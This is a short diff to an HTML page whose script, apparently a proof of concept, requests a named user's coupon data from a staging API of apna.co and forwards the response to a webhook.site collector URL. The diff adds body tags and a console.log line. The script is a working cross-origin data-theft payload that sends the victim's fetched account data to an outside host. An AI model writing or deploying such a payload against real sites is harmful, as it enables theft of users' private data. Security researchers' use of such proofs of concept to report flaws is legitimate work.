@@ -1,3 +1,4 @@
+<body>
 <script>
     fetch("https://backend-stg.apna.co/apna-coupon/api/v1/user/4948374/coupons-applicable?coupon_type=first_purchase,standard,promotional&source=EMDASH,INDASH&page=1&discount_type=percent&sort_on=cart_constraints.min_value&sort_order=asc", {
         method: "GET",
@@ -6,5 +7,7 @@
     .then(response => response.text())
     .then(data => {
         fetch("https://webhook.site/8fd97f40-7ea7-4587-8a2d-0d5ff484fafd/?data=" + encodeURIComponent(data));
+        console.log(data)
     });
 </script>
+</body>
